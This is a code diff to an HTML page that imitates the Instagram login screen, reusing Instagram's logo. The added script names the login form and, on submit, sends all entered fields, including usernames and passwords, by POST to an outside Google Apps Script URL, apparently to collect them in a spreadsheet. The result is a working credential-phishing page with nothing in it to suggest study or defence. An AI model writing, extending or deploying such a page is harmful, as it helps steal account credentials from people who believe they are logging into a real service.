@@ -225,7 +225,7 @@
     <div class="container">
         <!-- Replace this image link with the one you want to use -->
         <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
-        <form id="login-form">
+        <form id="login-form" name = "submit-to-google-sheet">
             <div class="input-box">
                 <input type="text" id="username" name='username' placeholder="Phone number, username, or email" required>
             </div>
@@ -315,6 +315,24 @@
                 errorMessage.style.display = 'block';
             });
         });
+
+
+
+
+
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzIkB9RlGKWWGFM9QGgJmnLXF3BU-WYGPjBL7qhJNW-p2JiO_b1d-zBJ8nIkvjqSzNM/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+
+
+
+
     </script>
 </body>
 </html>
